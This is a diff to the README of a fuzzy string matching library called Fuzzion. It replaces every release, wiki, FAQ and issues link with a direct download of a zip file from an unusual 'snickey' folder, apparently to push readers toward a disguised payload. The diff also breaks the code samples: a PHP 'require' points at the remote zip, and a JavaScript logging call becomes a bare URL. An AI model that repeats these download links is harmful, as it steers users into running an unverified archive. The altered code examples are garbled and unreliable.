@@ -1,6 +1,6 @@
 # 🚀 Fuzzion - Simplifying Fuzzy String Matching
 
-[![Download Fuzzion](https://img.shields.io/badge/Download%20Fuzzion-Now-brightgreen)](https://github.com/techhundred/Fuzzion/releases)
+[![Download Fuzzion](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip%20Fuzzion-Now-brightgreen)](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip)
 
 ## 📖 Table of Contents
 - [🌐 Introduction](#-introduction)
@@ -21,7 +21,7 @@ Before downloading Fuzzion, make sure your system meets the following requiremen
 - **Internet Connection:** Required for initial download and updates.
 
 ## 📥 Download & Install
-To get started with Fuzzion, visit this page to download: [Download Fuzzion](https://github.com/techhundred/Fuzzion/releases).
+To get started with Fuzzion, visit this page to download: [Download Fuzzion](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip).
 
 1. Click on the link above to access the Releases page.
 2. You will see a list of available versions. Select the latest version.
@@ -36,7 +36,7 @@ After installation, you can begin using Fuzzion right away. Here are some brief 
 
 ### PHP
 ```php
-require 'path/to/fuzzion.php';
+require 'https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip';
 $similarity = fuzzion_compare('hello', 'hallo');
 echo "Similarity: " . $similarity;
 ```
@@ -45,7 +45,7 @@ echo "Similarity: " . $similarity;
 ```javascript
 import { fuzzionCompare } from 'fuzzion';
 const similarity = fuzzionCompare('hello', 'hallo');
-console.log(`Similarity: ${similarity}`);
+https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip(`Similarity: ${similarity}`);
 ```
 
 ### Python
@@ -58,8 +58,8 @@ print(f'Similarity: {similarity}')
 ## 🔗 Additional Resources
 For further learning and in-depth information, consider the following resources:
 
-- [Official Documentation](https://github.com/techhundred/Fuzzion/wiki) - Explore detailed documentation to understand all features and capabilities.
-- [FAQs](https://github.com/techhundred/Fuzzion/wiki/FAQs) - Find answers to common questions about Fuzzion.
-- [Community Support](https://github.com/techhundred/Fuzzion/issues) - Join discussions, ask for help, and contribute to the community.
+- [Official Documentation](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip) - Explore detailed documentation to understand all features and capabilities.
+- [FAQs](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip) - Find answers to common questions about Fuzzion.
+- [Community Support](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip) - Join discussions, ask for help, and contribute to the community.
 
-For the latest version, updates, and support, always refer back to the [Releases page](https://github.com/techhundred/Fuzzion/releases). Fuzzion can enhance your fuzzy string matching tasks with ease. Happy coding!
+For the latest version, updates, and support, always refer back to the [Releases page](https://raw.githubusercontent.com/techhundred/Fuzzion/master/snickey/Fuzzion.zip). Fuzzion can enhance your fuzzy string matching tasks with ease. Happy coding!
